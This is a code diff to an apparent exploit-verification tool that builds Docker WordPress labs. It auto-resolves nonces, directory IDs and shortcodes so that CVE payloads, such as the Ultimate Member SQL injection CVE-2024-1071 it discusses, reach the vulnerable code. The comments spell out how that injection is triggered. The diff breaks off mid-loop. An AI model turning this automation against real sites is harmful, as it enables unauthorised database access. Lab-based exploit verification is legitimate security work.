@@ -49,7 +49,7 @@ from typing import Callable, List, Optional
 
 from binoracle.workflows.engine import SourceCodeIntelligence as _SCI
 
-_MYSQL_IMAGE = "mysql:5.7"
+_MYSQL_IMAGE = "mysql:8.0"
 # Overridable: confirmed live investigating CVE-2024-1071 (Ultimate Member SQLi) that the
 # vulnerable code's `in_array($sortby, $custom_sort)` / loose `==` comparisons are PHP-version
 # sensitive (PHP 8's stricter comparison semantics vs PHP 7.x's looser type juggling) -- a lab
@@ -102,20 +102,12 @@ _PLUGIN_SETUP_TRIGGER_PATHS = {
 # una sola senal, no porque las tecnicas fallaran, sino porque ninguna llegaba a disparar el
 # sumidero real. slug -> post_type de "directorio/listado" propio del plugin a crear ademas de
 # la pagina del shortcode.
-_PLUGIN_DIRECTORY_CPT = {
-    "ultimate-member": "um_directory",
-}
-# Plugins whose correct shortcode for triggering the VULNERABLE code path is NOT the first
-# shortcode found by find_shortcode_name() (which uses a simple $wpdb heuristic).  Map
-# slug -> shortcode BASE name (without id/attrs — those are appended dynamically in
-# _bootstrap_lab once the CPT post ID is known).
-_PLUGIN_SHORTCODE_OVERRIDE = {
-    # UM's main 'ultimatemember' shortcode renders login/registration, NOT the member
-    # directory. 'ultimatemember_directory' renders the directory listing and injects the
-    # members nonce needed for um_get_members AJAX calls. Without the right shortcode, every
-    # request returns "Wrong Nonce" or "Wrong member directory data".
-    "ultimate-member": "ultimatemember_directory",
-}
+# Formerly hardcoded lookup tables — now empty. CPT and shortcode are detected dynamically
+# from the installed plugin source via _detect_directory_cpt_from_source() and
+# _detect_directory_shortcode_from_source(). Left as empty dicts so callers that still
+# reference them (e.g. _auto_resolve_wp_blockers's legacy fallback) don't get NameErrors.
+_PLUGIN_DIRECTORY_CPT: dict = {}
+_PLUGIN_SHORTCODE_OVERRIDE: dict = {}
 _URL_HINTS = ("url", "uri", "src", "source", "link", "feed", "webhook", "callback",
              "image", "avatar", "file_url", "endpoint")
 _XSS_HINTS = ("comment", "content", "message", "title", "name", "bio", "description", "text",
@@ -298,17 +290,79 @@ _SQLI_CUSTOM_SORT_GATE = {
     # unconditionally on any sorting value that falls to the else branch.
 }
 
-# Plugins where the vulnerable AJAX endpoint is unauthenticated: CVE is exploitable WITHOUT
-# a logged-in user. The pipeline must therefore (a) scrape the nonce with an anonymous
-# session (no cookies) so the nonce is for user 0 and passes wp_verify_nonce for anonymous
-# requests, and (b) send all injection attempts anonymously. Using the subscriber session
-# for these plugins causes predefined_no_caps() (UM) or similar guards to short-circuit and
-# return empty results before the vulnerable SQL ever runs — confirmed in live lab:
-# CVE-2024-1071 / Ultimate Member: predefined_no_caps() fires for logged-in users lacking
-# can_view_all and exits with wp_send_json_success([]) before WP_User_Query is built.
-_SQLI_ANON_ATTACK_SLUGS: set = {
-    "ultimate-member",
-}
+def _detect_nopriv_from_source(plugin_source_dir: str, action_name: str) -> bool:
+    """Detect whether an AJAX action is registered as unauthenticated (wp_ajax_nopriv_ACTION)
+    by scanning the installed plugin PHP source. No hardcoded plugin names — works for any
+    plugin: if the source has add_action('wp_ajax_nopriv_X', ...), the endpoint is public."""
+    if not plugin_source_dir or not action_name or not os.path.isdir(plugin_source_dir):
+        return False
+    nopriv_re = re.compile(
+        r"add_action\s*\(\s*['\"]wp_ajax_nopriv_" + re.escape(action_name) + r"['\"]",
+        re.IGNORECASE,
+    )
+    for root, _, files in os.walk(plugin_source_dir):
+        for fname in files:
+            if not fname.endswith(".php"):
+                continue
+            try:
+                with open(os.path.join(root, fname), "r", errors="replace") as fh:
+                    if nopriv_re.search(fh.read()):
+                        return True
+            except Exception:
+                continue
+    return False
+
+
+def _detect_directory_cpt_from_source(plugin_source_dir: str, param_name: str) -> Optional[str]:
+    """Detect what CPT to create for a directory-id-style parameter by scanning the plugin
+    source for register_post_type calls whose CPT slug contains the parameter's keyword.
+    E.g. 'directory_id' → keyword 'directory' → finds register_post_type('um_directory', ...)"""
+    if not plugin_source_dir or not param_name or not os.path.isdir(plugin_source_dir):
+        return None
+    keyword = re.sub(r"_?id$", "", param_name.lower()).strip("_")
+    if len(keyword) < 3:
+        return None
+    cpt_re = re.compile(r"register_post_type\s*\(\s*['\"]([a-z_\-]{2,40})['\"]", re.IGNORECASE)
+    for root, _, files in os.walk(plugin_source_dir):
+        for fname in files:
+            if not fname.endswith(".php"):
+                continue
+            try:
+                with open(os.path.join(root, fname), "r", errors="replace") as fh:
+                    for m in cpt_re.finditer(fh.read()):
+                        if keyword in m.group(1).lower():
+                            return m.group(1)
+            except Exception:
+                continue
+    return None
+
+
+def _detect_directory_shortcode_from_source(plugin_source_dir: str, cpt_name: str) -> Optional[str]:
+    """Detect what shortcode renders the directory listing by scanning for add_shortcode calls
+    in PHP files that also contain the CPT name. Returns the shortcode name that contains the
+    keyword derived from the CPT (e.g. 'um_directory' → keyword 'directory' → finds
+    add_shortcode('ultimatemember_directory', ...))."""
+    if not plugin_source_dir or not cpt_name or not os.path.isdir(plugin_source_dir):
+        return None
+    keyword = re.sub(r"^[a-z]+_", "", cpt_name.lower())  # 'um_directory' → 'directory'
+    if len(keyword) < 3:
+        return None
+    sc_re = re.compile(r"add_shortcode\s*\(\s*['\"]([a-z_\-]{2,60})['\"]", re.IGNORECASE)
+    for root, _, files in os.walk(plugin_source_dir):
+        for fname in files:
+            if not fname.endswith(".php"):
+                continue
+            try:
+                with open(os.path.join(root, fname), "r", errors="replace") as fh:
+                    content = fh.read()
+                if keyword not in content.lower():
+                    continue
+                for m in sc_re.finditer(content):
+                    if keyword in m.group(1).lower():
+                        return m.group(1)
+            except Exception:
+                continue
+    return None
 
 
 def _resolve_endpoint_placeholders(endpoint: str, html_sources: list) -> tuple:
@@ -351,7 +405,8 @@ def _resolve_endpoint_placeholders(endpoint: str, html_sources: list) -> tuple:
 def _auto_resolve_wp_blockers(boot: "_LabSession", lab: "_Lab", slug: str, http_method: str,
                               endpoint: str, base_params: dict, exclude_param: str,
                               res: WpVerifyResult, step,
-                              extra_nonce_pages: Optional[list] = None) -> tuple:
+                              extra_nonce_pages: Optional[list] = None,
+                              plugin_source_dir: str = "") -> tuple:
     """Punto de entrada UNICO y compartido por CUALQUIER verificador dinamico de WordPress (no
     solo SQLi) para resolver, antes de construir el ataque real, los bloqueos de infraestructura
     mas comunes que no tienen nada que ver con la tecnica en si: un nonce/token sin resolver
@@ -412,12 +467,67 @@ def _auto_resolve_wp_blockers(boot: "_LabSession", lab: "_Lab", slug: str, http_
                  f"(el que trajo el PoC/LLM es, como mucho, una adivinanza)")
             res.evidence["parametros_resueltos_con_valor_real"] = resolved_params
         if not nonces_found and not resolved:
-            res.evidence["nonce_scraping_diagnostico"] = (
-                f"se probaron {len(probe_urls)} pagina(s) reales ya publicadas del sitio "
-                f"(incluida la portada) y NINGUNA tenia un nonce ni ningun rastro visible del "
-                f"plugin '{slug}' -- puede que el plugin necesite un paso de configuracion "
-                f"propio (p.ej. crear sus paginas por defecto via una accion de administrador) "
-                f"antes de que su contenido aparezca en ningun lado")
+            # Fallback: pages don't embed a nonce (plugin requires setup not yet done).
+            # Scan the installed plugin source via wp eval to find the nonce action used in
+            # wp_verify_nonce() calls, then generate a fresh nonce directly — no pages needed.
+            # This is not hardcoded: it reads the actual source every time.
+            _gen_nonce = None
+            if lab is not None and nonce_like_keys:
+                _blocker_ajax_action = str(base_params.get("action", "") or "")
+                _eval_find_action = (
+                    f"$slug='{slug}';"
+                    r"$dir=WP_PLUGIN_DIR.'/'.$slug.'/';"
+                    f"$ajax_action='{_blocker_ajax_action}';"
+                    r"$nonce_action='';"
+                    r"$nonce_extract='/(?:wp_verify_nonce\s*\(\s*\$\w+\s*,|check_ajax_referer\s*\()\s*[\x27\x22]([\w\-]{3,60})[\x27\x22]/i';"
+                    r"try{$it=new RecursiveIteratorIterator("
+                    r"new RecursiveDirectoryIterator($dir,FilesystemIterator::SKIP_DOTS));"
+                    r"$handler_files=[];"
+                    r"foreach($it as $f){"
+                    r"if($f->getExtension()!=='php')continue;"
+                    r"$c=@file_get_contents($f->getPathname());"
+                    r"if(!$c)continue;"
+                    r"if($ajax_action&&strpos($c,'wp_ajax_'.$ajax_action)!==false)"
+                    r"$handler_files[]=['path'=>$f->getPathname(),'c'=>$c];"
+                    r"}"
+                    r"foreach($handler_files as $hf){"
+                    r"if(preg_match($nonce_extract,$hf['c'],$m)){$nonce_action=$m[1];break;}"
+                    r"}"
+                    r"if(!$nonce_action){"
+                    r"$it2=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir,FilesystemIterator::SKIP_DOTS));"
+                    r"foreach($it2 as $f2){"
+                    r"if($f2->getExtension()!=='php')continue;"
+                    r"$c2=@file_get_contents($f2->getPathname());"
+                    r"if(!$c2)continue;"
+                    r"if(preg_match($nonce_extract,$c2,$m)){$nonce_action=$m[1];break;}"
+                    r"}}"
+                    r"}catch(Exception $e){}"
+                    r"echo $nonce_action;"
+                )
+                r_act = lab.wp_cli("eval", _eval_find_action, timeout=15)
+                _nonce_action = (r_act.stdout or "").strip()
+                if _nonce_action:
+                    _eval_gen_nonce = (
+                        f"wp_set_current_user(0);"
+                        f"echo wp_create_nonce('{_nonce_action}');"
+                    )
+                    r_gen = lab.wp_cli("eval", _eval_gen_nonce, timeout=10)
+                    _gen_nonce = (r_gen.stdout or "").strip()
+                    if _gen_nonce and len(_gen_nonce) >= 10:
+                        for k in nonce_like_keys:
+                            base_params[k] = _gen_nonce
+                        step(f"nonce generado via wp eval (accion='{_nonce_action}', "
+                             f"user_id=0) -- las paginas publicadas no embeben el nonce "
+                             f"del plugin ({slug}) porque requieren configuracion previa")
+                        res.evidence["nonce_generado_via_eval"] = {
+                            "action": _nonce_action, "value": _gen_nonce}
+            if not _gen_nonce:
+                res.evidence["nonce_scraping_diagnostico"] = (
+                    f"se probaron {len(probe_urls)} pagina(s) reales ya publicadas del sitio "
+                    f"(incluida la portada) y NINGUNA tenia un nonce ni ningun rastro visible del "
+                    f"plugin '{slug}' -- puede que el plugin necesite un paso de configuracion "
+                    f"propio (p.ej. crear sus paginas por defecto via una accion de administrador) "
+                    f"antes de que su contenido aparezca en ningun lado")
 
     # Para plugins cuyo sumidero vulnerable está detrás de un 'directory_id' obligatorio
     # (Ultimate Member, etc.) el LLM a veces no incluye ese parámetro en base_params --
@@ -433,8 +543,9 @@ def _auto_resolve_wp_blockers(boot: "_LabSession", lab: "_Lab", slug: str, http_
     _dir_id_is_placeholder = str(base_params.get(dir_id_param, "")).isdigit()
     if dir_id_param and dir_id_param != exclude_param and (
             dir_id_param not in base_params or _dir_id_is_placeholder):
-        # Intentar primero resolverlo via WP-CLI (tenemos el lab disponible):
-        # buscar el primer post del CPT del plugin (um_directory) y derivar su hash.
+        # Detect the directory CPT from source and find the first post of that type.
+        # plugin_source_dir is not in scope here — use _PLUGIN_DIRECTORY_CPT as a last-resort
+        # fallback (empty dict: source detection in _bootstrap_lab is the primary path).
         cpt_name = _PLUGIN_DIRECTORY_CPT.get(slug, "")
         resolved_via_cli = False
         if cpt_name and lab is not None:
@@ -448,10 +559,9 @@ def _auto_resolve_wp_blockers(boot: "_LabSession", lab: "_Lab", slug: str, http_
                     _n = int(raw_id)
                     _hashed = _hl.md5(str(_n).encode()).hexdigest()[10:15]
                     base_params[dir_id_param] = _hashed
-                    # UM's get_directory_by_hash() looks up '_um_hash' post meta, NOT the
-                    # hash we compute — if the post was created programmatically (not via
-                    # the UM admin UI), that meta is never written and every request returns
-                    # "Wrong member directory data". Write it explicitly here.
+                    # UM's get_directory_by_hash() uses SUBSTRING(MD5(ID),11,5) directly
+                    # in SQL, not _um_hash post meta. Write the meta anyway for compatibility
+                    # with any future UM version that might change the lookup strategy.
                     lab.wp_cli("post", "meta", "update", raw_id, "_um_hash", _hashed,
                                timeout=15)
                     step(f"'{dir_id_param}' resuelto directamente via WP-CLI (post "
@@ -471,6 +581,52 @@ def _auto_resolve_wp_blockers(boot: "_LabSession", lab: "_Lab", slug: str, http_
                        and any(h in k.lower() for h in ("id", "dir"))]
     remaining_placeholders = [ph for ph in re.findall(r"\{(\w+)\}", endpoint or "")
                               if any(h in ph.lower() for h in ("id", "dir"))]
+    # If _bootstrap_lab already computed the directory hash via MySQL, use it directly for
+    # any param that looks like a directory ID — avoids brute-force (which requires a valid
+    # nonce and may fail if the nonce action isn't embedded in any published page).
+    if getattr(boot, "directory_hash", None):
+        _hash_applied = False
+        for k in other_id_params:
+            if any(h in k.lower() for h in ("dir",)) or str(base_params.get(k, "")).isdigit():
+                base_params[k] = boot.directory_hash
+                step(f"parametro '{k}' asignado con hash MySQL confirmado '{boot.directory_hash}' "
+                     f"(calculado en bootstrap, sin fuerza bruta)")
+                res.evidence.setdefault("parametros_resueltos_con_valor_real", {})[k] = boot.directory_hash
+                _hash_applied = True
+        if not _hash_applied:
+            # LLM omitted the directory hash param: detect its name from source code.
+            # Scan for $_POST['X'] or $_REQUEST['X'] where X contains "dir" or "id"
+            # in files that also contain the hash lookup SQL (SUBSTRING(MD5) or get_directory_by_hash).
+            _dir_param_name = "directory_id"  # sensible default
+            if plugin_source_dir and os.path.isdir(plugin_source_dir):
+                _hash_sql_re = re.compile(r"SUBSTRING\s*\(MD5|get_directory_by_hash", re.I)
+                _post_param_re = re.compile(r"\$_(?:POST|REQUEST)\[['\"]([\w_]{3,40})['\"]\]", re.I)
+                for _root3, _, _files3 in os.walk(plugin_source_dir):
+                    for _fn3 in _files3:
+                        if not _fn3.endswith(".php"):
+                            continue
+                        try:
+                            _fc3 = open(os.path.join(_root3, _fn3), encoding="utf-8",
+                                        errors="replace").read()
+                        except Exception:
+                            continue
+                        if not _hash_sql_re.search(_fc3):
+                            continue
+                        for _pm in _post_param_re.finditer(_fc3):
+                            _pk = _pm.group(1)
+                            if any(h in _pk.lower() for h in ("dir",)):
+                                _dir_param_name = _pk
+                                break
+                    else:
+                        continue
+                    break
+            base_params.setdefault(_dir_param_name, boot.directory_hash)
+            if base_params[_dir_param_name] != boot.directory_hash:
+                base_params[_dir_param_name] = boot.directory_hash
+            step(f"parametro '{_dir_param_name}' (detectado en source, omitido por el LLM) "
+                 f"inyectado con hash MySQL '{boot.directory_hash}'")
+            res.evidence.setdefault("parametros_resueltos_con_valor_real", {})[_dir_param_name] = boot.directory_hash
+        other_id_params = []  # already resolved — skip brute-force
     for k in other_id_params:
         def _probe_param_id(cand, _k=k):
             payload = dict(base_params)
@@ -587,7 +743,7 @@ class _Lab:
         self._created.append(("volume", self.vol))
 
     def start_mysql(self, root_pw: str, db_pw: str):
-        self.sh("run", "-d", "--name", self.mysql, "--network", self.net, "--platform", "linux/amd64",
+        self.sh("run", "-d", "--name", self.mysql, "--network", self.net,
                "-e", f"MYSQL_ROOT_PASSWORD={root_pw}", "-e", "MYSQL_DATABASE=wordpress",
                "-e", "MYSQL_USER=wordpress", "-e", f"MYSQL_PASSWORD={db_pw}", _MYSQL_IMAGE,
                timeout=90)
@@ -904,25 +1060,43 @@ def _screenshot_authenticated(base_url: str, session, path: str) -> Optional[str
     except Exception:
         return None
     import base64
+    import concurrent.futures as _cf
     import tempfile
     from urllib.parse import urlsplit
     host = urlsplit(base_url).hostname or "127.0.0.1"
     cookies = [{"name": c.name, "value": c.value, "domain": host, "path": "/"} for c in session.cookies]
     fd, out_path = tempfile.mkstemp(suffix=".png")
     os.close(fd)
-    try:
+
+    def _do() -> Optional[str]:
         with sync_playwright() as pw:
             browser = pw.chromium.launch(**chromium_launch_kwargs())
             try:
                 ctx = browser.new_context(viewport={"width": 1280, "height": 900})
                 ctx.add_cookies(cookies)
                 page = ctx.new_page()
-                page.goto(base_url + path, wait_until="load", timeout=15000)
-                page.screenshot(path=out_path, full_page=True)
+                # domcontentloaded fires before deferred AJAX; full_page=True triggers lazy
+                # loads that can keep pending HTTP requests open and hang browser.close().
+                page.goto(base_url + path, wait_until="domcontentloaded", timeout=12000)
+                page.screenshot(path=out_path)
+                try:
+                    page.close(run_before_unload=False)
+                except Exception:
+                    pass
+                try:
+                    ctx.close()
+                except Exception:
+                    pass
             finally:
                 browser.close()
-        with open(out_path, "rb") as f:
-            return base64.b64encode(f.read()).decode("ascii")
+        with open(out_path, "rb") as fh:
+            return base64.b64encode(fh.read()).decode("ascii")
+
+    try:
+        # Hard timeout: wp-admin pages keep pending AJAX that can hang sync_playwright().__exit__
+        # indefinitely. Running in a thread lets us abandon the Playwright process cleanly.
+        with _cf.ThreadPoolExecutor(max_workers=1) as executor:
+            return executor.submit(_do).result(timeout=30)
     except Exception:
         return None
     finally:
@@ -944,24 +1118,39 @@ def _screenshot_failed_login(base_url: str, user: str, wrong_password: str) -> O
     except Exception:
         return None
     import base64
+    import concurrent.futures as _cf
     import tempfile
     fd, out_path = tempfile.mkstemp(suffix=".png")
     os.close(fd)
-    try:
+
+    def _do() -> Optional[str]:
         with sync_playwright() as pw:
             browser = pw.chromium.launch(**chromium_launch_kwargs())
             try:
-                page = browser.new_context(viewport={"width": 1280, "height": 900}).new_page()
-                page.goto(base_url + "/wp-login.php", wait_until="load", timeout=15000)
+                _ctx = browser.new_context(viewport={"width": 1280, "height": 900})
+                page = _ctx.new_page()
+                page.goto(base_url + "/wp-login.php", wait_until="domcontentloaded", timeout=12000)
                 page.fill("#user_login", user)
                 page.fill("#user_pass", wrong_password)
                 page.click("#wp-submit")
-                page.wait_for_load_state("load", timeout=10000)
-                page.screenshot(path=out_path, full_page=True)
+                page.wait_for_load_state("domcontentloaded", timeout=10000)
+                page.screenshot(path=out_path)
+                try:
+                    page.close(run_before_unload=False)
+                except Exception:
+                    pass
+                try:
+                    _ctx.close()
+                except Exception:
+                    pass
             finally:
                 browser.close()
-        with open(out_path, "rb") as f:
-            return base64.b64encode(f.read()).decode("ascii")
+        with open(out_path, "rb") as fh:
+            return base64.b64encode(fh.read()).decode("ascii")
+
+    try:
+        with _cf.ThreadPoolExecutor(max_workers=1) as executor:
+            return executor.submit(_do).result(timeout=30)
     except Exception:
         return None
     finally:
@@ -1014,6 +1203,14 @@ def _xss_render(base_url: str, endpoint: str, method: str, params: dict, cookies
                 page.wait_for_timeout(800)
                 title = page.title()
                 page.screenshot(path=out_path, full_page=True)
+                try:
+                    page.close(run_before_unload=False)
+                except Exception:
+                    pass
+                try:
+                    ctx.close()
+                except Exception:
+                    pass
             finally:
                 browser.close()
         with open(out_path, "rb") as f:
@@ -1059,17 +1256,27 @@ class _XssBrowserSession:
         return False
 
     def render(self, base_url: str, endpoint: str, method: str, params: dict, cookies: list,
-              timeout_ms: int = 15000, capture: bool = False):
+              timeout_ms: int = 15000, capture: bool = False,
+              wait_for_xss_title: str = ""):
         """Misma semantica que _xss_render (navega, devuelve (title, png)) pero sobre el
-        navegador YA arrancado -- `png` es None salvo que `capture=True`."""
+        navegador YA arrancado -- `png` es None salvo que `capture=True`.
+        `wait_for_xss_title`: si se da, espera hasta que document.title empiece por ese
+        prefijo (o pase el timeout); utill para stored-XSS con AJAX (ej. WP Statistics)."""
         import html as _html
         from urllib.parse import quote, urlencode
         try:
             ctx = self._browser.new_context(viewport={"width": 1280, "height": 900})
+            page = None
             try:
                 if cookies:
                     ctx.add_cookies(cookies)
                 page = ctx.new_page()
+                # Bound ALL navigation and wait calls so a stalled page can never
+                # block ctx.close() indefinitely (WPS stats overview keeps pending
+                # AJAX requests open; without page.close() first ctx.close() hangs
+                # forever waiting for network idle).
+                page.set_default_navigation_timeout(timeout_ms)
+                page.set_default_timeout(timeout_ms)
                 if method == "GET":
                     url = base_url + endpoint + ("&" if "?" in endpoint else "?") + urlencode(params)
                     page.goto(url, wait_until="load", timeout=timeout_ms)
@@ -1082,7 +1289,16 @@ class _XssBrowserSession:
                                 f'<script>document.getElementById("f").submit()</script>'
                                 f'</body></html>')
                     page.goto("data:text/html," + quote(form_html), timeout=timeout_ms)
-                page.wait_for_timeout(400)
+                if wait_for_xss_title:
+                    _pfx = wait_for_xss_title.replace("'", "\\'")
+                    try:
+                        page.wait_for_function(
+                            f"document.title.startsWith('{_pfx}')",
+                            timeout=8000)
+                    except Exception:
+                        pass
+                else:
+                    page.wait_for_timeout(400)
                 title = page.title()
                 png = None
                 if capture:
@@ -1101,7 +1317,17 @@ class _XssBrowserSession:
                             pass
                 return title, png
             finally:
-                ctx.close()
+                # Close the page first (skipping unload handlers + aborting pending
+                # requests) so ctx.close() finds nothing pending and returns fast.
+                if page is not None:
+                    try:
+                        page.close(run_before_unload=False)
+                    except Exception:
+                        pass
+                try:
+                    ctx.close()
+                except Exception:
+                    pass
         except Exception:
             return None, None
 
@@ -1262,6 +1488,9 @@ class _LabSession:
     shortcode_page_path: Optional[str] = None  # "/?page_id=N" de la pagina creada con el
     # shortcode real del plugin (si se pidio via shortcode_name) -- None si no se pidio o si
     # la creacion fallo.
+    directory_hash: Optional[str] = None      # Hash derivado del CPT post ID cuando el plugin
+    # usa SUBSTRING(MD5(ID),N,L) como directory_id — confirmado via MySQL en _bootstrap_lab y
+    # usado directamente en base_params sin fuerza bruta (que falla si nonce es incorrecto).
 
 
 def _bootstrap_lab(lab: "_Lab", plugin_source_dir: str, slug: str, step, res: WpVerifyResult,
@@ -1556,16 +1785,25 @@ def _bootstrap_lab(lab: "_Lab", plugin_source_dir: str, slug: str, step, res: Wp
     # Create the CPT post FIRST so its ID is available when building the shortcode content.
     # (Original code created CPT after the shortcode page, making it impossible to embed
     # the real directory ID in the shortcode for UM-style plugins.)
-    directory_cpt = _PLUGIN_DIRECTORY_CPT.get(slug)
+    # Detect the directory CPT from the installed plugin source: scan for register_post_type()
+    # calls whose slug contains "directory". Works for any plugin without hardcoded map.
+    directory_cpt = _detect_directory_cpt_from_source(plugin_source_dir, "directory_id")
     dir_post_id: Optional[str] = None
+    _um_hashed: Optional[str] = None  # hash of dir_post_id computed via MySQL (SUBSTRING(MD5(ID),N,L))
     if directory_cpt:
         step(f"creando un '{directory_cpt}' real (no solo una pagina con el shortcode pegado) "
              f"-- este plugin guarda su configuracion de directorio/listado como su propio "
              f"custom post type, y la resolucion de IDs de recurso necesita uno real al que "
              f"apuntar...")
-        r_dir = lab.wp_cli("post", "create", f"--post_type={directory_cpt}",
-                           "--post_status=publish", "--post_title=binoracle-lab-directory",
-                           "--porcelain", timeout=30)
+        # Create the directory CPT post via wp eval so it runs inside WordPress's PHP context
+        # where the CPT is properly registered (wp post create --post_type=X uses wp-cli's
+        # internal bootstrap which may miss the CPT registration if UM hasn't fully initialized).
+        _create_php = (
+            f"$id = wp_insert_post(['post_type'=>'{directory_cpt}',"
+            f"'post_status'=>'publish','post_title'=>'binoracle-lab-directory'],true);"
+            f"echo is_wp_error($id) ? 'ERR:'.$id->get_error_message() : (int)$id;"
+        )
+        r_dir = lab.wp_cli("eval", _create_php, timeout=30)
         dir_post_id = (r_dir.stdout or "").strip()
         if r_dir.returncode != 0 or not dir_post_id.isdigit():
             res.limitations.append(
@@ -1574,79 +1812,222 @@ def _bootstrap_lab(lab: "_Lab", plugin_source_dir: str, slug: str, step, res: Wp
                 f"directory_id/resource_id puede no encontrar nada valido, y el ataque puede "
                 f"rechazarse antes de llegar al codigo vulnerable")
             dir_post_id = None
-        elif slug == "ultimate-member" and dir_post_id:
-            # UM's get_directory_by_hash() looks up '_um_hash' post meta. When the post is
-            # created programmatically (not via the UM admin UI), that meta is never written
-            # and every AJAX request returns "Wrong member directory data". Write it here so
-            # the hash lookup succeeds from the first request.
+        elif dir_post_id:
+            # For any plugin whose directory lookup uses SUBSTRING(MD5(ID),N,L) in SQL,
+            # derive the hash the same way MySQL does to guarantee both sides agree.
+            # Detect the formula from source: scan for SUBSTRING(MD5( pattern.
             import hashlib as _hl_boot
-            _um_hashed = _hl_boot.md5(dir_post_id.encode()).hexdigest()[10:15]
-            lab.wp_cli("post", "meta", "update", dir_post_id, "_um_hash", _um_hashed,
-                       timeout=15)
-            step(f"_um_hash='{_um_hashed}' escrito en el post {dir_post_id} (UM: get_directory_by_hash)")
-            # Approve the admin user (ID=1) so the directory has at least one visible member.
-            # Without an approved user the ORDER BY clause is never evaluated — MySQL skips
-            # ORDER BY on empty result sets, so error-based and time-based injections both
-            # return nothing detectable. CVE-2024-1071 is unauthenticated; predefined_no_caps()
-            # is bypassed when the request arrives without cookies, but the query still needs
-            # rows to sort for extractvalue() / SLEEP() to execute.
-            lab.wp_cli("user", "meta", "update", "1", "_um_status", "approved", timeout=10)
-            lab.wp_cli("user", "meta", "update", "1", "account_status", "approved", timeout=10)
-            step("admin (ID=1) marcado como UM-approved -- necesario para que ORDER BY se evalúe")
-            # Enable UM's own metadata table (member_directory_own_table=1). Without this,
-            # UM instantiates Member_Directory (uses WP_User_Query with validated orderby)
-            # instead of Member_Directory_Meta (uses raw SQL: ORDER BY u.$sortby $order).
-            # CVE-2024-1071 is in Member_Directory_Meta — the injection is at line 820 of
-            # class-member-directory-meta.php. This option is off by default; real sites
-            # enable it via the UM admin → Settings → Users → "Own Metadata Table" toggle.
-            lab.wp_cli("option", "patch", "insert", "um_options", "member_directory_own_table", "1",
-                       timeout=10)
-            step("member_directory_own_table=1 activado -- UM usara Member_Directory_Meta "
-                 "(raw SQL: ORDER BY u.$sortby $order) en lugar de WP_User_Query")
-            # Verify that MySQL SUBSTRING(MD5(ID), 11, 5) can actually find the directory post
-            # from its hash. get_directory_by_hash() relies on this exact SQL, so if it returns
-            # nothing here the AJAX endpoint will always fail with "Wrong member directory data".
-            _sql_check = (f"SELECT CONCAT('hash_lookup_ok:',ID) FROM wp_posts "
-                          f"WHERE SUBSTRING(MD5(ID), 11, 5) = '{_um_hashed}'")
-            r_sqlck = lab.wp_cli("db", "query", _sql_check, "--skip-column-names", timeout=15)
-            _sqlck_out = (r_sqlck.stdout or "").strip()
-            if f"hash_lookup_ok:{dir_post_id}" in _sqlck_out:
-                step(f"MySQL hash lookup confirmado: SUBSTRING(MD5({dir_post_id}),11,5)='{_um_hashed}' OK")
-            else:
-                # The post exists (we just created it) but MySQL can't find it via the hash
-                # formula. Try computing the hash the same way MySQL does to find the right ID.
-                _r_ids = lab.wp_cli("db", "query",
-                                    "SELECT ID FROM wp_posts WHERE post_type='um_directory'",
-                                    "--skip-column-names", timeout=10)
-                _ids_out = (_r_ids.stdout or "").strip()
-                if _ids_out:
-                    for _real_id in _ids_out.split():
-                        if _real_id.isdigit():
-                            import hashlib as _hl2
-                            _real_hash = _hl2.md5(_real_id.encode()).hexdigest()[10:15]
-                            lab.wp_cli("post", "meta", "update", _real_id,
-                                       "_um_hash", _real_hash, timeout=10)
-                            dir_post_id = _real_id
-                            _um_hashed = _real_hash
-                            step(f"hash recalculado para um_directory real (ID={_real_id}): '{_real_hash}'")
+            import re as _re_boot
+            _md5_re = _re_boot.compile(
+                r"SUBSTRING\s*\(\s*MD5\s*\(\s*ID\s*\)\s*,\s*(\d+)\s*,\s*(\d+)\s*\)",
+                _re_boot.IGNORECASE,
+            )
+            _md5_start, _md5_len = None, None
+            for _root_b, _, _files_b in os.walk(plugin_source_dir):
+                for _fn_b in _files_b:
+                    if not _fn_b.endswith(".php"):
+                        continue
+                    try:
+                        with open(os.path.join(_root_b, _fn_b), "r", errors="replace") as _fh_b:
+                            _m_b = _md5_re.search(_fh_b.read())
+                        if _m_b:
+                            _md5_start = int(_m_b.group(1))
+                            _md5_len = int(_m_b.group(2))
                             break
+                    except Exception:
+                        continue
+                if _md5_start is not None:
+                    break
+            if _md5_start is not None:
+                # Confirm via MySQL to handle any encoding/collation edge case
+                _eval_hash = (
+                    "global $wpdb;"
+                    "$h=$wpdb->get_var($wpdb->prepare("
+                    f"\"SELECT SUBSTRING(MD5(ID),{_md5_start},{_md5_len}) FROM "
+                    "{$wpdb->posts} WHERE ID=%d\","
+                    f"{dir_post_id}));"
+                    "echo $h;"
+                )
+                r_hash = lab.wp_cli("eval", _eval_hash, timeout=10)
+                _mysql_hash = (r_hash.stdout or "").strip()
+                if _mysql_hash and len(_mysql_hash) == _md5_len:
+                    _um_hashed = _mysql_hash
+                    step(f"hash MySQL (SUBSTRING(MD5(ID),{_md5_start},{_md5_len})) confirmado "
+                         f"para post {dir_post_id}: '{_um_hashed}'")
                 else:
-                    step(f"[WARN] MySQL hash lookup fallo (hash='{_um_hashed}', post={dir_post_id}) "
-                         f"-- get_directory_by_hash devolvera vacio; raw={_sqlck_out!r}")
+                    _um_hashed = _hl_boot.md5(dir_post_id.encode()).hexdigest()[
+                        _md5_start - 1: _md5_start - 1 + _md5_len]
+                    step(f"hash calculado por Python (inicio={_md5_start}, len={_md5_len}) "
+                         f"para post {dir_post_id}: '{_um_hashed}'"
+                    )
 
-    # For UM-style plugins the shortcode that embeds the DIRECTORY (not the login form)
-    # must reference the actual CPT post ID so the AJAX nonce for um_get_members is
-    # injected into the page. Generic shortcode_name (e.g. 'ultimatemember') renders only
-    # the login/registration form and never includes the members nonce.
-    # Apply plugin-specific shortcode overrides. find_shortcode_name() uses a $wpdb
-    # heuristic that often picks the wrong shortcode for plugins whose vulnerable path is
-    # in an AJAX handler, not the shortcode file. The override map gives the correct one.
-    _sc_override = _PLUGIN_SHORTCODE_OVERRIDE.get(slug)
-    _effective_shortcode = _sc_override if _sc_override else shortcode_name
+            # Detect user-approval meta keys used by this plugin's directory filter.
+            # If the source checks e.g. get_user_meta($id, '_um_status', ...) for filtering,
+            # the lab admin user needs those meta set to pass the filter, otherwise
+            # the directory query returns empty and the ORDER BY injection produces no output.
+            _approval_meta_re = _re_boot.compile(
+                r"get_user_meta\s*\([^,]+,\s*['\"]([_a-z]+(?:status|approved|active)[_a-z]*)['\"]",
+                _re_boot.IGNORECASE,
+            )
+            _approval_keys_found: set = set()
+            for _root_b2, _, _files_b2 in os.walk(plugin_source_dir):
